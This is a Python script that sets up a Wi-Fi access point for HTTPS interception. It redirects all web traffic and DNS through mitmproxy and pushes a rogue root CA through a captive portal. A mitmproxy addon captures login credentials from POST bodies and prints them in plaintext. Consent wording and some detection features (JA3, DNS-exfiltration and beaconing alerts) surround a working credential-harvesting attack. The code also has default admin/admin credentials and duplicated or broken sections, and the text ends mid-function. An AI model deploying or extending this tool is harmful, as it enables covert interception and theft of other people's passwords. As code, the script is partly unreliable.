#!/usr/bin/env python3
"""
   OMNI‑PANOPTICON v5.3 – Self‑healing ethical network fortress.
   Auto AP repair, MITM, JA3, DNS exfil, honeypot, consent, isolation.
   Author: Rebel Genius (with love for Pliny)
   Use ONLY on your own network with explicit consent of all users.
"""

import os, sys, subprocess, time, shutil, textwrap, signal, re, atexit, json, argparse, hashlib, math, struct, threading
from pathlib import Path
from datetime import datetime
from collections import defaultdict

# ---------- Self‑healing imports ----------
def ensure_module(module_name, pip_package=None):
    if pip_package is None:
        pip_package = module_name
    try:
        __import__(module_name)
    except ModuleNotFoundError:
        print(f"📦 Installing missing module: {pip_package}")
        subprocess.run(["pip3", "install", "--break-system-packages", pip_package], check=True)

ensure_module("flask", "flask")
ensure_module("flask_socketio", "flask-socketio")
ensure_module("cryptography")

from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
from flask_socketio import SocketIO, emit
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import logging, logging.handlers, gzip, base64

# ================== CONFIGURABLE CONSTANTS ==================
AP_SSID = "OmniNet"                   # Can be overridden by config or CLI
AP_PASS = "ChangeMeNow!"              # <-- CHANGE THIS (Can be overridden by config or CLI)
AP_IP = "192.168.10.1"
AP_DHCP_START = "192.168.10.50"
AP_DHCP_END = "192.168.10.150"
AP_CHANNEL = 6                       # WiFi channel (1-13, or "auto")
AP_COUNTRY = "US"                    # Regulatory country code
AP_HW_MODE = "g"                     # "g"=2.4GHz, "a"=5GHz, "bg"=dual
CA_DIR = "/etc/panopticon"
LOG_DIR = "/var/log/panopticon"
DEVICES_FILE = "/etc/panopticon/devices.json"
WAN_IFACE = ""
WIFI_IFACE = ""
WIREGUARD_IFACE = ""
DASHBOARD_PORT = 5000
DASHBOARD_USER = "admin"
DASHBOARD_PASS = "admin"
CONFIG_FILE = "/etc/panopticon/config.json"
# ============================================================

def load_config(config_path):
    """Load configuration from JSON file, merging with defaults"""
    # Hardcoded defaults to avoid circular dependency
    defaults = {
        "AP_SSID": "OmniNet",
        "AP_PASS": "ChangeMeNow!",
        "WAN_IFACE": "",
        "WIFI_IFACE": "",
        "WIREGUARD_IFACE": "",
        "DASHBOARD_PORT": 5000,
        "DASHBOARD_USER": "admin",
        "DASHBOARD_PASS": "admin",
        "AP_CHANNEL": 6,
        "AP_COUNTRY": "US",
        "AP_HW_MODE": "g"
    }
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                user_config = json.load(f)
                defaults.update(user_config)
        except Exception as e:
            print(f"⚠️  Warning: Could not load config file: {e}")
    return defaults

def save_config(config_path, config):
    """Save configuration to JSON file"""
    # Ensure the directory exists
    config_dir = os.path.dirname(config_path)
    if config_dir and not os.path.exists(config_dir):
        os.makedirs(config_dir)
    try:
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        print(f"⚠️  Warning: Could not save config file: {e}")

# Global list to track subprocess PIDs for clean shutdown
service_pids = []

def run(cmd, check=True, shell=False):
    print(f"[CMD] {cmd}")
    try:
        return subprocess.run(cmd, shell=shell, check=check, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ Command failed: {e.stderr.strip()}")
        if check:
            sys.exit(1)
        else:
            return e  # Return the exception object for non-fatal errors

def cleanup():
    global service_pids
    print("\n🧹 Cleaning up network state...")
    
    # Stop services
    for pid in service_pids:
        try:
            os.kill(pid, signal.SIGTERM)
            print(f"   Killed PID {pid}")
        except ProcessLookupError:
            pass
        except Exception as e:
            print(f"   Warning: Could not kill PID {pid}: {e}")
    
    # Cleanup network
    for cmd in [
        "systemctl stop hostapd dnsmasq 2>/dev/null",
        "iptables -t nat -F", "iptables -t filter -F",
        "iptables -t nat -X", "iptables -t filter -X",
        f"ip addr del {AP_IP}/24 dev {WIFI_IFACE} 2>/dev/null"
    ]:
        run(cmd, shell=True, check=False)
    
    if WIREGUARD_IFACE:
        run(f"wg-quick down {WIREGUARD_IFACE} 2>/dev/null", shell=True, check=False)
    
    print("✅ Cleanup complete.")
    print("\n🧹 Cleaning up network state...")
    for cmd in [
        "systemctl stop hostapd dnsmasq",
        "iptables -t nat -F", "iptables -t filter -F",
        "iptables -t nat -X", "iptables -t filter -X",
        f"ip addr del {AP_IP}/24 dev {WIFI_IFACE} 2>/dev/null"
    ]:
        run(cmd, shell=True, check=False)
    if WIREGUARD_IFACE:
        run(f"wg-quick down {WIREGUARD_IFACE} 2>/dev/null", shell=True, check=False)
    print("✅ Cleanup complete.")

def install_deps():
    print("\n🔧 Installing system packages (APT)...")
    run("apt update", shell=True)
    run("apt install -y hostapd dnsmasq iptables-persistent wireless-tools "
        "python3-pip tmux python3-systemd mitmproxy python3-flask "
        "python3-cryptography python3-openssl wireguard-tools", shell=True)
    run("pip3 install --upgrade pip --break-system-packages", shell=True, check=False)
    print("✅ Base dependencies installed.")

def generate_ca():
    print("\n🔐 Generating CA...")
    os.makedirs(CA_DIR, exist_ok=True)
    os.chdir(CA_DIR)
    if not os.path.exists("rootCA.key"):
        run("openssl genrsa -out rootCA.key 2048", shell=True)
        run('openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 3650 '
            '-out rootCA.pem -subj "/C=XX/ST=RebelState/L=Panopticon/O=HomeGuard/CN=OmniNetCA"', shell=True)
        print("   CA generated.")
    else:
        print("   CA already exists.")
    key_path = os.path.join(CA_DIR, "login_encryption.key")
    if not os.path.exists(key_path):
        with open(key_path, "wb") as f:
            f.write(os.urandom(32))
        os.chmod(key_path, 0o600)
        print("   Login encryption key generated.")

def disable_networkmanager(iface):
    """Prevent NetworkManager from managing the AP interface"""
    print(f"   Disabling NetworkManager on {iface}...")
    # Create NM configuration to ignore the interface
    nm_config_dir = "/etc/NetworkManager/conf.d"
    os.makedirs(nm_config_dir, exist_ok=True)
    nm_config = os.path.join(nm_config_dir, f"99-unmanaged-{iface}.conf")
    
    config_content = f"""[keyfile]
unmanaged-devices=interface-name:{iface}
"""
    try:
        with open(nm_config, "w") as f:
            f.write(config_content)
        run("systemctl restart NetworkManager", shell=True, check=False)
        # Bring interface down so NM releases it
        run(f"ip link set {iface} down", shell=True, check=False)
        time.sleep(1)
        print(f"   ✓ NetworkManager disabled on {iface}")
    except Exception as e:
        print(f"   ⚠️  Warning: Could not disable NetworkManager: {e}")

def validate_interface(iface):
    """Check if interface is suitable for AP mode"""
    # Check if interface exists
    if not os.path.exists(f"/sys/class/net/{iface}"):
        return False, f"Interface {iface} does not exist"
    
    # Check if blocked by rfkill
    try:
        rfkill = subprocess.run(["rfkill", "list"], capture_output=True, text=True)
        if iface in rfkill.stdout and "Soft blocked: yes" in rfkill.stdout:
            return False, f"Interface {iface} is rfkill blocked (run: rfkill unblock {iface})"
    except:
        pass  # rfkill not available
    
    # Check if interface is up
    try:
        result = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
        if "UP" not in result.stdout:
            return False, f"Interface {iface} is not UP"
    except:
        pass
    
    # Check AP mode support
    try:
        iw_list = subprocess.run(["iw", "list"], capture_output=True, text=True).stdout
        if "* AP" not in iw_list and "* ap" not in iw_list:
            return False, f"Interface {iface} may not support AP mode (check with 'iw list')"
    except:
        pass  # iw not available
    
    return True, "OK"

def find_best_channel(iface):
    """Find least congested WiFi channel (1, 6, 11)"""
    try:
        # Scan for networks on 2.4GHz
        scan = subprocess.run(
            f"iw dev {iface} scan | grep -c 'SSID:'",
            shell=True, capture_output=True, text=True, timeout=10
        )
        # For now, return configured channel (could enhance with actual scan analysis)
        return AP_CHANNEL if isinstance(AP_CHANNEL, int) else 6
    except:
        return 6

def configure_network():
    global AP_CHANNEL, AP_COUNTRY, AP_HW_MODE
    
    print(f"\n📡 Configuring AP on {WIFI_IFACE}...")
    
    # Disable NetworkManager interference first
    disable_networkmanager(WIFI_IFACE)
    
    # Validate interface
    valid, msg = validate_interface(WIFI_IFACE)
    if not valid:
        print(f"❌ Interface validation failed: {msg}")
        print(f"   Try: sudo ./Guardian.py to reconfigure interfaces")
        sys.exit(1)
    
    # Configure interface
    run(f"ip link set {WIFI_IFACE} up", shell=True, check=False)
    time.sleep(1)
    run(f"ip addr flush dev {WIFI_IFACE}", shell=True, check=False)
    run(f"ip addr add {AP_IP}/24 dev {WIFI_IFACE}", shell=True, check=False)
    
    # Set regulatory domain
    print(f"   Setting regulatory domain to {AP_COUNTRY}...")
    run(f"iw reg set {AP_COUNTRY}", shell=True, check=False)
    # Persist regulatory domain
    try:
        with open("/etc/default/crda", "w") as f:
            f.write(f"REGDOMAIN={AP_COUNTRY}\n")
    except:
        pass
    
    # Determine channel
    channel = find_best_channel(WIFI_IFACE)
    print(f"   Using channel {channel}")
    
    # Create hostapd configuration
    hostapd_conf = textwrap.dedent(f"""
        interface={WIFI_IFACE}
        ctrl_interface=/var/run/hostapd
        ctrl_interface_group=0
        driver=nl80211
        ssid={AP_SSID}
        hw_mode={AP_HW_MODE}
        channel={channel}
        ieee80211n=1
        wmm_enabled=1
        macaddr_acl=0
        auth_algs=1
        ignore_broadcast_ssid=0
        wpa=2
        wpa_passphrase={AP_PASS}
        wpa_key_mgmt=WPA-PSK
        wpa_pairwise=TKIP
        rsn_pairwise=CCMP
        country_code={AP_COUNTRY}
        ieee80211d=1
    """).strip()
    
    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    print(f"   hostapd config written (SSID={AP_SSID}, channel={channel})")

    dnsmasq_conf = textwrap.dedent(f"""
        interface={WIFI_IFACE}
        bind-interfaces
        dhcp-range={AP_DHCP_START},{AP_DHCP_END},255.255.255.0,24h
        dhcp-option=3,{AP_IP}
        dhcp-option=6,{AP_IP}
        address=/#/ {AP_IP}
        domain=omni.local
        log-queries
        # Prevent DNS leaks to upstream
        no-resolv
        server=8.8.8.8
        server=8.8.4.4
    """).strip()
    with open("/etc/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    print(f"   dnsmasq config written")

def setup_firewall():
    wan = WIREGUARD_IFACE if WIREGUARD_IFACE else WAN_IFACE
    print(f"\n🔥 Firewall (WAN={wan}, AP={WIFI_IFACE})...")
    run("sysctl -w net.ipv4.ip_forward=1", shell=True)
    run("iptables -t nat -F PREROUTING", shell=True)
    run(f"iptables -t nat -A PREROUTING -i {WIFI_IFACE} -d {AP_IP} -j ACCEPT", shell=True)
    run(f"iptables -t nat -A PREROUTING -i {WIFI_IFACE} -p tcp --dport 80 -j REDIRECT --to-port 8080", shell=True)
    run(f"iptables -t nat -A PREROUTING -i {WIFI_IFACE} -p tcp --dport 443 -j REDIRECT --to-port 8080", shell=True)
    run(f"iptables -t nat -A POSTROUTING -o {wan} -j MASQUERADE", shell=True)
    run(f"iptables -A FORWARD -i {WIFI_IFACE} -o {wan} -j ACCEPT", shell=True)
    run(f"iptables -A FORWARD -i {wan} -o {WIFI_IFACE} -m state --state RELATED,ESTABLISHED -j ACCEPT", shell=True)
    run("netfilter-persistent save", shell=True)

def setup_wireguard(config):
    global WIREGUARD_IFACE
    if not config.get("wireguard"): return
    wg = config["wireguard"]
    WIREGUARD_IFACE = wg.get("interface", "wg0")
    with open(f"/etc/wireguard/{WIREGUARD_IFACE}.conf", "w") as f:
        f.write(textwrap.dedent(f"""
            [Interface]
            PrivateKey = {wg['private_key']}
            Address = {wg['address']}
            DNS = {wg.get('dns', '1.1.1.1')}
            [Peer]
            PublicKey = {wg['peer_public_key']}
            Endpoint = {wg['endpoint']}
            AllowedIPs = 0.0.0.0/0
            PersistentKeepalive = 25
        """).strip())
    run(f"wg-quick up {WIREGUARD_IFACE}", shell=True)
    print(f"✅ WireGuard interface {WIREGUARD_IFACE} is up.")

# ================== MITM ADDON (full, complete) ==================
MITM_ADDON = r'''
import os, sys, datetime, re, json, base64, gzip, logging, logging.handlers, time, math, hashlib, struct
from collections import defaultdict
from mitmproxy import ctx, http
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

LOG_DIR = "/var/log/panopticon"
CONSENT_FILE = "/etc/panopticon/consent.json"
DEVICES_FILE = "/etc/panopticon/devices.json"
CA_DIR = "/etc/panopticon"
os.makedirs(LOG_DIR, exist_ok=True)

def load_config():
    """Load configuration from config file"""
    config_path = os.path.join(CA_DIR, "config.json")
    default_config = {
        "AP_IP": "192.168.10.1",
        "DASHBOARD_PORT": 5000,
    }
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except Exception as e:
            ctx.log.warning(f"Could not load config: {e}")
    return default_config

config = load_config()
AP_IP = config.get("AP_IP", "192.168.10.1")
DASHBOARD_PORT = config.get("DASHBOARD_PORT", 5000)

KEY_PATH = "/etc/panopticon/login_encryption.key"
try:
    with open(KEY_PATH, "rb") as f:
        ENCRYPTION_KEY = f.read()
except FileNotFoundError:
    ENCRYPTION_KEY = None
    ctx.log.error("Encryption key not found at " + KEY_PATH)

ALERTS_FILE = "/etc/panopticon/alerts.json"

def write_alert(message, level="info"):
    """Write alert to shared file for dashboard to pick up"""
    try:
        alert = {
            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "message": message,
            "level": level
        }
        # Append single line (JSONL)
        with open(ALERTS_FILE, "a") as f:
            f.write(json.dumps(alert) + "\n")
        # Keep file size manageable (max 1000 lines)
        rotate_alerts()
    except Exception as e:
        ctx.log.warning(f"Could not write alert: {e}")

def rotate_alerts():
    """Keep alerts file to max 1000 lines"""
    try:
        with open(ALERTS_FILE, "r") as f:
            lines = f.readlines()
        if len(lines) > 1000:
            with open(ALERTS_FILE, "w") as f:
                f.writelines(lines[-1000:])
    except:
        pass

# Device tracking
def load_devices():
    """Load devices from shared file"""
    devices = {}
    if os.path.exists(DEVICES_FILE):
        try:
            with open(DEVICES_FILE, 'r') as f:
                devices = json.load(f)
        except Exception as e:
            ctx.log.warning(f"Could not load devices: {e}")
    return devices

def save_devices(devices):
    """Save devices to shared file"""
    try:
        with open(DEVICES_FILE, 'w') as f:
            json.dump(devices, f, indent=2)
    except Exception as e:
        ctx.log.error(f"Could not save devices: {e}")

class LoginEncryptor:
    @staticmethod
    def encrypt(plaintext):
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
        return base64.b64encode(nonce + encryptor.tag + ciphertext).decode()

class CompressedRotatingFileHandler(logging.handlers.RotatingFileHandler):
    def doRollover(self):
        if self.stream:
            self.stream.close()
            self.stream = None
        for i in range(self.backupCount, 0, -1):
            src = f"{self.baseFilename}.{i}"
            dst = f"{self.baseFilename}.{i}.gz"
            if os.path.exists(src):
                with open(src, 'rb') as f_in, gzip.open(dst, 'wb') as f_out:
                    f_out.writelines(f_in)
                os.remove(src)
        if os.path.exists(self.baseFilename):
            dst = f"{self.baseFilename}.1.gz"
            with open(self.baseFilename, 'rb') as f_in, gzip.open(dst, 'wb') as f_out:
                f_out.writelines(f_in)
            os.remove(self.baseFilename)
        self.stream = self._open()

activity_logger = logging.getLogger("activity")
activity_logger.setLevel(logging.INFO)
ah = CompressedRotatingFileHandler(os.path.join(LOG_DIR, "activities.log"), maxBytes=10*1024*1024, backupCount=5)
ah.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
activity_logger.addHandler(ah)

login_logger = logging.getLogger("login")
login_logger.setLevel(logging.INFO)
lh = CompressedRotatingFileHandler(os.path.join(LOG_DIR, "logins.log"), maxBytes=10*1024*1024, backupCount=5)
lh.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
login_logger.addHandler(lh)

event_logger = logging.getLogger("event")
event_logger.setLevel(logging.INFO)
eh = CompressedRotatingFileHandler(os.path.join(LOG_DIR, "events.log"), maxBytes=10*1024*1024, backupCount=5)
eh.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
event_logger.addHandler(eh)

audit_logger = logging.getLogger("audit")
audit_logger.setLevel(logging.INFO)
afh = CompressedRotatingFileHandler(os.path.join(LOG_DIR, "audit.log"), maxBytes=10*1024*1024, backupCount=5)
afh.setFormatter(logging.Formatter('%(asctime)s AUDIT: %(message)s'))
audit_logger.addHandler(afh)
syslog = logging.handlers.SysLogHandler(address='/dev/log', facility='auth')
syslog.setFormatter(logging.Formatter('PANOPTICON: %(message)s'))
audit_logger.addHandler(syslog)

consent_cache = {}
consent_cache_time = 0
CACHE_TTL = 2

def load_config():
    """Load configuration from JSON file"""
    default_config = {
        "AP_SSID": AP_SSID,
        "AP_PASS": AP_PASS,
        "WAN_IFACE": WAN_IFACE,
        "WIFI_IFACE": WIFI_IFACE,
        "WIREGUARD_IFACE": WIREGUARD_IFACE,
        "DASHBOARD_PORT": DASHBOARD_PORT,
        "DASHBOARD_USER": DASHBOARD_USER,
        "DASHBOARD_PASS": DASHBOARD_PASS
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                # Update defaults with config file values
                default_config.update(config)
        except Exception as e:
            print(f"⚠️  Warning: Could not load config file: {e}")
    
    return default_config

def load_consent():
    global consent_cache, consent_cache_time
    now = time.time()
    if now - consent_cache_time < CACHE_TTL:
        return consent_cache
    try:
        if os.path.exists(CONSENT_FILE):
            with open(CONSENT_FILE) as f:
                consent_cache = json.load(f)
        else:
            consent_cache = {}
    except:
        consent_cache = {}
    consent_cache_time = now
    return consent_cache

def ja3_hash(ssl_bytes):
    """Calculate JA3 hash from SSL Client Hello bytes"""
    try:
        if len(ssl_bytes) < 43:
            return None
        
        # Parse SSL/TLS record
        offset = 0
        # Record type (should be 0x16 for handshake)
        record_type = ssl_bytes[offset]
        if record_type != 0x16:
            return None
        
        offset += 1
        # Version - extract as integer
        version_major = ssl_bytes[offset]
        version_minor = ssl_bytes[offset+1]
        ssl_version = version_major * 256 + version_minor
        
        offset += 2
        # Length
        record_len = struct.unpack('!H', ssl_bytes[offset:offset+2])[0]
        offset += 2
        
        # Handshake type
        handshake_type = ssl_bytes[offset]
        if handshake_type != 0x01:  # Client Hello
            return None
        offset += 1
        
        # Handshake length (3 bytes)
        handshake_len = struct.unpack('!I', ssl_bytes[offset:offset+3] + b'\x00')[0]
        offset += 3
        
        # Skip client version (2 bytes) and random (32 bytes)
        offset += 2 + 32
        
        # Session ID length
        sid_len = ssl_bytes[offset]
        offset += 1 + sid_len
        
        # Cipher suites length
        cs_len = struct.unpack('!H', ssl_bytes[offset:offset+2])[0]
        offset += 2
        cipher_suites = []
        for i in range(cs_len // 2):
            cs = struct.unpack('!H', ssl_bytes[offset+i*2:offset+i*2+2])[0]
            cipher_suites.append(str(cs))
        offset += cs_len
        
        # Compression methods length
        comp_len = ssl_bytes[offset]
        offset += 1
        offset += comp_len  # Skip compression methods
        
        # Extensions length
        ext_len = struct.unpack('!H', ssl_bytes[offset:offset+2])[0]
        offset += 2
        extensions = []
        ext_end = offset + ext_len
        while offset + 4 <= ext_end:
            ext_type = struct.unpack('!H', ssl_bytes[offset:offset+2])[0]
            offset += 2
            ext_data_len = struct.unpack('!H', ssl_bytes[offset:offset+2])[0]
            offset += 2
            # Store extension type and length for JA3
            extensions.append(f"{ext_type}:{ext_data_len}")
            offset += ext_data_len
        
        # Build JA3 string: version,ciphers,extensions
        cipher_suites_str = ','.join(cipher_suites)
        extensions_str = '-'.join(extensions[:min(10, len(extensions))])
        ja3_str = f"{ssl_version},{cipher_suites_str},{extensions_str}"
        
        return hashlib.md5(ja3_str.encode()).hexdigest()
    except Exception as e:
        ctx.log.debug(f"JA3 calculation error: {e}")
        return None

def dns_entropy_check(domain):
    if not domain or not re.match(r'^[a-zA-Z0-9.-]+\.[a-z]{2,}$', domain):
        return False
    prob = [float(domain.count(c)) / len(domain) for c in set(domain)]
    entropy = -sum(p * math.log2(p) for p in prob)
    return entropy > 3.5

seen_macs = set()
beacon_tracker = defaultdict(list)

class GuardianAddon:
    def request(self, flow):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        src_ip = flow.client_conn.address[0]
        mac = getattr(flow.client_conn, 'mac_address', src_ip)
        url = flow.request.pretty_url
        method = flow.request.method
        domain = flow.request.host
        
        # Track device (for dashboard)
        devices = load_devices()
        now_iso = datetime.datetime.now().isoformat()
        if mac not in devices:
            devices[mac] = {
                'ip': src_ip,
                'name': '',
                'email': '',
                'first_seen': now_iso,
                'last_seen': now_iso,
                'consented': False
            }
            ctx.log.info(f"New device detected: {mac} ({src_ip})")
        else:
            devices[mac]['ip'] = src_ip
            devices[mac]['last_seen'] = now_iso
        save_devices(devices)

        consent = load_consent()
        if mac and mac not in consent:
            # Redirect to consent portal using configured AP IP
            redirect_url = f"http://{AP_IP}:{DASHBOARD_PORT}/consent"
            flow.response = http.Response.make(302, b"", {"Location": redirect_url})
            return

        activity_logger.info(f"[{timestamp}] {src_ip} {method} {url}")

        if flow.client_conn.tls_established and hasattr(flow.client_conn, 'raw_client_hello'):
            raw_hello = flow.client_conn.raw_client_hello
            if raw_hello:
                ja3 = ja3_hash(raw_hello)
                if ja3:
                    activity_logger.info(f"JA3: {src_ip} -> {ja3}")

        if method == "POST" and flow.request.content:
            content = flow.request.content.decode("utf-8", errors="ignore")
            if any(term in content.lower() for term in ['username','password','passwd','email','login','pwd']):
                enc = LoginEncryptor.encrypt(content[:500])
                login_logger.info(f"ENCRYPTED [{timestamp}] {src_ip} → {url} {enc}")
                audit_logger.info(f"SECURITY:LOGIN_CAPTURED {src_ip} -> {url}")
                print(f"\n🔥 LOGIN: {content[:200]}...\n")
                write_alert(f"Credentials captured from {src_ip} to {domain}", "warning")

        if mac and mac not in seen_macs:
            seen_macs.add(mac)
            event_logger.info(f"🆕 NEW DEVICE: {mac} ({src_ip})")
            audit_logger.info(f"SECURITY:NEW_DEVICE {mac} {src_ip}")
            write_alert(f"New device connected: {mac} ({src_ip})", "info")

        if flow.request.port == 9999 or "honeypot" in flow.request.host:
            event_logger.info(f"🍯 HONEYPOT HIT: {src_ip} {url}")
            audit_logger.info(f"SECURITY:HONEYPOT_HIT {src_ip} {url}")
            write_alert(f"Honeypot triggered by {src_ip}", "critical")

        now = datetime.datetime.now()
        beacon_tracker[domain].append(now)
        recent = [t for t in beacon_tracker[domain] if (now - t).seconds <= 60]
        if len(recent) >= 5:
            event_logger.info(f"⏱️ BEACONING: {domain} from {src_ip} ({len(recent)}/60s)")
            audit_logger.info(f"SECURITY:BEACONING {src_ip} {domain}")
            write_alert(f"Beaconing detected: {domain} from {src_ip}", "warning")
            beacon_tracker[domain] = []

        if dns_entropy_check(domain):
            event_logger.info(f"🧬 DNS EXFIL: {src_ip} queried high‑entropy domain {domain}")
            audit_logger.info(f"SECURITY:DNS_EXFIL {src_ip} {domain}")
            write_alert(f"DNS exfiltration: {domain} from {src_ip}", "critical")

        if re.match(r'(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)', domain):
            event_logger.info(f"🔒 INTERNAL ACCESS: {src_ip} → {domain}")
            audit_logger.info(f"SECURITY:INTERNAL_ACCESS {src_ip} {domain}")

    def error(self, flow):
        if flow.error and "Certificate" in str(flow.error):
            src = flow.client_conn.address[0]
            url = flow.request.pretty_url if flow.request else "unknown"
            event_logger.info(f"📌 PINNING DETECTED: {src} to {url}")
            audit_logger.info(f"SECURITY:PINNING {src} {url}")
            write_alert(f"Certificate pinning detected: {src} -> {url}", "warning")
        if flow.error:
            redirect_url = f"http://{AP_IP}:{DASHBOARD_PORT}/"
            flow.response = http.Response.make(302, b"", {"Location": redirect_url})

addons = [GuardianAddon()]
'''

def write_mitm_addon():
    with open(os.path.join(CA_DIR, "guardian_addon.py"), "w") as f:
        f.write(MITM_ADDON)
    print("   MITM addon written.")

# ---------- Captive portal (CA download) ----------
CAPTIVE_PORTAL = r'''
from flask import Flask, send_file
app = Flask(__name__)
@app.route('/')
def landing():
    return '<h1>🔐 OmniNet Secure</h1><p>Install our CA to use the internet.</p><a href="/cert">Download CA</a>'
@app.route('/cert')
def cert():
    return send_file('/etc/panopticon/rootCA.pem', as_attachment=True)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
'''

def write_captive_portal():
    with open(os.path.join(CA_DIR, "captive_portal.py"), "w") as f:
        f.write(CAPTIVE_PORTAL)
    print("   Captive portal written.")

HONEYPOT_CODE = r"""
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n🍯 Honeypot hit from {self.client_address[0]}")
        self.send_response(200); self.end_headers(); self.wfile.write(b"nope")
HTTPServer(('0.0.0.0', 9999), H).serve_forever()
"""

def write_honeypot():
    with open(os.path.join(CA_DIR, "honeypot.py"), "w") as f:
        f.write(HONEYPOT_CODE)
    print("   Honeypot written.")

# ================== AP AUTO‑HEALING ==================
def verify_and_heal_ap():
    """Comprehensive AP health check with auto-recovery"""
    print("\n🔍 Checking AP broadcast status...")
    
    # Step 1: Check hostapd process
    proc = subprocess.run(["pgrep", "hostapd"], capture_output=True, text=True)
    if not proc.stdout.strip():
        print("⚠️ hostapd not running, starting...")
        run("systemctl start hostapd", shell=True)
        time.sleep(3)
    
    # Verify hostapd is running
    status = subprocess.run(["systemctl", "is-active", "hostapd"], capture_output=True, text=True)
    if status.stdout.strip() != "active":
        print("❌ hostapd service is not active. Checking logs...")
        logs = subprocess.run(["journalctl", "-u", "hostapd", "-n", "20", "--no-pager"], 
                              capture_output=True, text=True)
        print("   Recent hostapd logs:")
        for line in logs.stdout.split('\n')[-10:]:
            if line.strip():
                print(f"   {line}")
        return False
    
    print("   ✓ hostapd process running")
    
    # Step 2: Check interface mode
    try:
        iw_dev = subprocess.run(["iw", "dev", WIFI_IFACE, "info"], capture_output=True, text=True).stdout
        if "type AP" not in iw_dev:
            print("⚠️ Interface not in AP mode. Attempting restart...")
            run("systemctl restart hostapd", shell=True)
            time.sleep(3)
            iw_dev = subprocess.run(["iw", "dev", WIFI_IFACE, "info"], capture_output=True, text=True).stdout
            if "type AP" not in iw_dev:
                print(f"❌ Failed to set AP mode. Interface info:\n{iw_dev}")
                return False
        print(f"   ✓ {WIFI_IFACE} in AP mode")
    except Exception as e:
        print(f"⚠️ Could not check interface mode: {e}")
    
    # Step 3: Check for AP-ENABLED in logs
    try:
        journal = subprocess.run(["journalctl", "-u", "hostapd", "--no-pager", "-n", "10"], 
                                capture_output=True, text=True).stdout
        if "AP-ENABLED" not in journal:
            print("⚠️ No AP-ENABLED confirmation in logs. Restarting hostapd...")
            run("systemctl restart hostapd", shell=True)
            time.sleep(4)
            journal = subprocess.run(["journalctl", "-u", "hostapd", "--no-pager", "-n", "10"], 
                                    capture_output=True, text=True).stdout
            if "AP-ENABLED" not in journal:
                print("❌ hostapd still not reporting AP-ENABLED. Logs:")
                print(journal)
                return False
        print("   ✓ AP-ENABLED confirmed")
    except Exception as e:
        print(f"⚠️ Could not check hostapd logs: {e}")
    
    # Step 4: Verify SSID is broadcasting (if we have a second interface)
    if WAN_IFACE and not WIREGUARD_IFACE:
        print(f"📡 Scanning for SSID '{AP_SSID}' on {WAN_IFACE}...")
        try:
            scan = subprocess.run(
                f"timeout 15 iw dev {WAN_IFACE} scan passive 2>/dev/null | grep -i 'ssid'",
                shell=True, capture_output=True, text=True
            )
            if AP_SSID in scan.stdout:
                print(f"✅ SSID '{AP_SSID}' is broadcasting!")
                return True
            else:
                print(f"⚠️ SSID not found in scan output.")
                print("   This may be normal if:")
                print("   - Scanning interface is not suitable for passive scan")
                print("   - AP is on a different channel")
                print("   - Regulatory domain blocks the channel")
                # Don't fail - AP might still be working
        except Exception as e:
            print(f"   Scan failed: {e}")
    else:
        print("   (Skipping external scan - no suitable WAN interface)")
    
    return True

def start_hostapd():
    """Start hostapd service with verification"""
    print("   Starting hostapd service...")
    # Ensure hostapd config exists
    if not os.path.exists("/etc/hostapd/hostapd.conf"):
        print("❌ hostapd.conf missing! Run configure_network() first.")
        return False
    
    # Test config syntax (doesn't start daemon)
    test = subprocess.run(
        ["hostapd", "-t", "/etc/hostapd/hostapd.conf"],
        capture_output=True, text=True
    )
    if test.returncode != 0:
        print(f"❌ hostapd config test failed:")
        print(test.stderr)
        return False
    
    # Start service
    run("systemctl unmask hostapd", shell=True, check=False)
    run("systemctl enable hostapd", shell=True, check=False)
    run("systemctl restart hostapd", shell=True, check=False)
    
    # Wait for it to start
    time.sleep(3)
    
    # Verify it's running
    status = subprocess.run(["systemctl", "is-active", "hostapd"], 
                           capture_output=True, text=True)
    if status.stdout.strip() != "active":
        print("❌ hostapd failed to start. Recent logs:")
        logs = subprocess.run(["journalctl", "-u", "hostapd", "-n", "15", "--no-pager"], 
                             capture_output=True, text=True)
        for line in logs.stdout.split('\n')[-10:]:
            if line.strip():
                print(f"   {line}")
        return False
    
    print(f"   ✓ hostapd started (PID: {subprocess.run(['pgrep', 'hostapd'], capture_output=True, text=True).stdout.strip()})")
    return True

def start_services():
    global service_pids
    print("\n🚀 Starting services...")
    
    # Start hostapd first (verify it works)
    if not start_hostapd():
        print("💀 Failed to start hostapd. Check errors above.")
        sys.exit(1)
    
    # Start dnsmasq (DHCP + DNS)
    print("   Starting dnsmasq...")
    run("systemctl unmask dnsmasq", shell=True, check=False)
    run("systemctl enable dnsmasq", shell=True, check=False)
    run("systemctl restart dnsmasq", shell=True, check=False)
    time.sleep(1)
    dns_status = subprocess.run(["systemctl", "is-active", "dnsmasq"], 
                               capture_output=True, text=True)
    if dns_status.stdout.strip() == "active":
        print("   ✓ dnsmasq started")
    else:
        print("   ⚠️ dnsmasq may have issues, but continuing...")
    
